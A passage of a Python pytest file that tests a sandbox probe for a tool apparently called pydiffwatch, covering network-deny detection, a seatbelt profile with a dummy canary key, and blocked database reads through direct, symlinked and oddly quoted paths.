    (ConnectionRefusedError(errno.ECONNREFUSED, "Connection refused"), "open"),   # the packet left the box
    (TimeoutError("timed out"), "open"),
])
def test_the_probe_counts_only_a_network_deny_as_blocked(error, seen, monkeypatch):
    # Ruling R14: an offline host or a firewall that drops the packet must not look like a sandbox that holds
    from pydiffwatch import _parse_worker

    def connect(*a, **k):
        raise error
    monkeypatch.setattr(_parse_worker.socket, "create_connection", connect)
    assert _parse_worker._net() == seen


@seatbelt
def test_the_seatbelt_probe_holds_all_seven(tmp_path, monkeypatch):
    monkeypatch.setenv("PYDIFFWATCH_CANARY_KEY", "sk-canary-0123456789")
    assert sandbox.probe(_cfg(tmp_path), "seatbelt") == _HELD


def _probe_db_in(tmp_path, db_dir):
    """Probe with the database in db_dir, a directory inside pydiffwatch/ (Ruling R7): the checkout's only readable
    directory, so only the private-dir deny can make db_read blocked."""
    try:
        return sandbox.probe(_cfg(tmp_path, db_path=db_dir / "db.sqlite"), "seatbelt")["db_read"]
    finally:
        for p in (sandbox._PKG / ".diffwatch-probe-test", sandbox._PKG / '.diffwatch probe "q" \\ dir'):
            if p.exists():
                p.rmdir()


@seatbelt
def test_a_database_inside_the_package_dir_is_unreadable(tmp_path):
    db_dir = sandbox._PKG / ".diffwatch-probe-test"
    db_dir.mkdir(exist_ok=True)
    assert _probe_db_in(tmp_path, db_dir) == "blocked"


@seatbelt
def test_a_database_reached_through_a_symlink_is_unreadable(tmp_path):
    # Review Focus 3
    real = sandbox._PKG / ".diffwatch-probe-test"
    real.mkdir(exist_ok=True)
    (tmp_path / "db-link").symlink_to(real)
    assert _probe_db_in(tmp_path, tmp_path / "db-link") == "blocked"


@seatbelt
def test_a_database_dir_with_a_space_quotes_and_a_backslash_is_unreadable(tmp_path):
    # Review Focus 2: a mis-quoted profile would fail to load (SandboxError) or match the wrong path
    odd = sandbox._PKG / '.diffwatch probe "q" \\ dir'
    odd.mkdir(exist_ok=True)
    assert _probe_db_in(tmp_path, odd) == "blocked"
